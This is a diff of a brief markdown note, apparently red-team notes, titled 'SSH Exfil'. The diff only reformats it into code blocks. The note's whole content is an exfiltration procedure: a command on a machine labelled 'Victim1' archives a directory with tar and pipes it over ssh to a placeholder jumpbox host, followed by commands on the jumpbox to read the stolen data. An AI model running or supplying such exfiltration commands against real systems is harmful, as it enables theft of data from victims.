@@ -1,7 +1,13 @@
+# SSH Exfil
+
 ## Commands:
 
-#### 1) Victim1: tar cf - dir/ | ssh USER@JUMPBOX_IP
+#### 1) Victim1: 
 
-#### 2) Jumpbox: cd /tmp/dir
+    tar cf - dir/ | ssh USER@JUMPBOX_IP
 
-#### cat data.txt
+#### 2) Jumpbox: 
+
+    cd /tmp/dir
+
+    cat data.txt
